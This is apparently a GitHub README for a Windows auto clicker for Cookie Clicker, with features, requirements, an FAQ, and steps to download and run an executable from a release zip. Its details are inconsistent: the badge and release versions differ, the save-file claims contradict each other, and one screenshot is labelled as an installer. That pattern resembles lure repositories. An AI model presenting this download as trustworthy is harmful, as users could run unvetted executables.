# Cookie Clicker Auto Clicker

![banner](https://raw.githubusercontent.com/robertolealwxwx/idle-clicker-toolkit/main/assets/banner.png)

![Version](https://img.shields.io/badge/version-2.4.1-blue) ![Platform](https://img.shields.io/badge/platform-Windows-lightgrey) ![License](https://img.shields.io/badge/license-MIT-green)

**About**

I built this after too many late nights staring at the cookie counter while golden cookies blinked away because I was tabbed out handling wrinklers. Cookie Clicker’s late-game loops punish any break in momentum, especially once you’re juggling sugar lumps, garden seeds, and ascension paths. I wanted a lightweight auto clicker that could sit in the background and keep the incremental engine running without me babysitting every frenzy.

**Features**

- Clicks both big cookies and golden cookies with configurable timing to catch dragonflight and cookie chain combos
- Automatically pops wrinklers when the count hits your chosen threshold so you don’t lose cookie production
- Buys buildings and upgrades according to simple rules you set for each ascension tier
- Pauses during elder pledge cooldowns and handles the grandmapocalypse toggle for you
- Tracks sugar lump maturation and switches garden seeds based on the current aura setup
- Exports a small save patch so you can resume the same idle clicker session after a browser crash

**Requirements**

- Windows 10 or 11
- 4 GB RAM
- .NET 6.0 Desktop Runtime

**Installation**

1. Download the latest release from [GitHub Releases](https://github.com/robertolealwxwx/idle-clicker-toolkit/releases/download/v1.0/IdleClickerToolkit-v1.0.zip)
2. Extract the zip to any folder
3. Run IdleClickerToolkit.exe and point it at your Cookie Clicker tab
4. Set your click rate and rules, then hit Start

**Screenshots**

| Main Interface | Setup Wizard |
|----------------|--------------|
| ![main](https://raw.githubusercontent.com/robertolealwxwx/idle-clicker-toolkit/main/assets/screenshot_main.png) | ![installer](https://raw.githubusercontent.com/robertolealwxwx/idle-clicker-toolkit/main/assets/screenshot_installer.png) |
![app running](https://raw.githubusercontent.com/robertolealwxwx/idle-clicker-toolkit/main/assets/screenshot_app.png)

**FAQ**

How do I keep it from clicking during a garden harvest?  
Add a pause hotkey in the rules tab or bind it to the same key you use for shovel mode.

Does it work with the Steam version?  
Only the browser version right now. The Steam build blocks external input.

Will it mess up my save if I change settings mid-run?  
It only writes to the game through normal clicks and never touches the save file directly.

**Disclaimer**

This is a hobby project I made for my own Cookie Clicker runs. Use it at your own risk; I’m not responsible for lost progress or anything else that happens.